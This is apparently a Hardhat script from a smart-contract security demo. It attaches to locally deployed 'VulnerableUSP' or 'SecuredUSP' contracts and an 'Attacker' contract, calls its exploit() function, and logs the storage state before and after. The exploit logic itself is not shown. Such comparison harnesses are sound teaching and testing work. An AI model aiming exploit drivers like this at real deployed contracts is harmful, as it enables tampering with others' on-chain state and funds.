const hre = require("hardhat");

async function main() {
  let contract = process.env.Contract;
  const contractAttacker = "Attacker";
  if (!contract) {
    contract = "VulnerableUSP";
  }

  console.log(`Initiating an attack with contract: ${contract}`);

  const [deployer, attackerSigner] = await hre.ethers.getSigners();

  // Retrieve deployed contracts
  const USP = await hre.ethers.getContractFactory(contract);
  const Attacker = await hre.ethers.getContractFactory(contractAttacker);

  // Addresses of the deployed contracts (replace with actual addresses after deployment)
  const storageContractAddress =
    // "0x9A9f2CCfdE556A7E9Ff0848998Aa4a0CFD8863AE"   // VulnerableUSP
    "0x4A679253410272dd5232B3Ff7cF5dbB88f295319"      // SecuredUSP
    ;

  const attackerAddress =
    // "0x68B1D87F95878fE05B998F19b66F4baba5De1aed"   // VulnerableUSP
    "0x7a2088a1bFc9d81c55368AE168C2C02570cB814F"      // SecuredUSP
    ;

  const storageContract = USP.attach(storageContractAddress);
  const attacker = Attacker.attach(attackerAddress);

  // Initial values before exploit
  console.log("Initial stateVariable value:", 
    (await storageContract.connect(deployer).getStateVariable()).toString());
  console.log("Initial arrayData:", await storageContract.getArrayData());

  // Exploit: Call fun() through Attacker
  console.log("Running exploit...");
  await attacker.connect(attackerSigner).exploit();

  // Display values after exploit
  console.log("stateVariable after exploit:", (await storageContract.getStateVariable()).toString());
  console.log("arrayData after exploit:", await storageContract.getArrayData());
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
